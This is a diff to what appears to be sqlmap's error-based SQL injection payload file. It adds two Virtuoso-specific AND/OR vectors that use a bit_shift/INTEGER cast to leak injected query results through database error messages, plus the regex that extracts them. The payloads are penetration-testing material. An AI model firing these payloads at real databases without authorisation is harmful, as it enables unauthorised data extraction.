@@ -959,6 +959,45 @@
     </test>
 
     <test>
+        <title>Virtuoso AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <!-- bit_shift (Virtuoso-exclusive) encloses the value-bearing INTEGER cast: reflects on Virtuoso, fails to bind elsewhere -->
+        <vector>AND [RANDNUM]=bit_shift(CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS INTEGER),1)</vector>
+        <request>
+            <payload>AND [RANDNUM]=bit_shift(CAST('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' AS INTEGER),1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Virtuoso</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Virtuoso OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=bit_shift(CAST('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' AS INTEGER),1)</vector>
+        <request>
+            <payload>OR [RANDNUM]=bit_shift(CAST('[DELIMITER_START]'||(SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' AS INTEGER),1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Virtuoso</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>IBM DB2 AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>3</level>
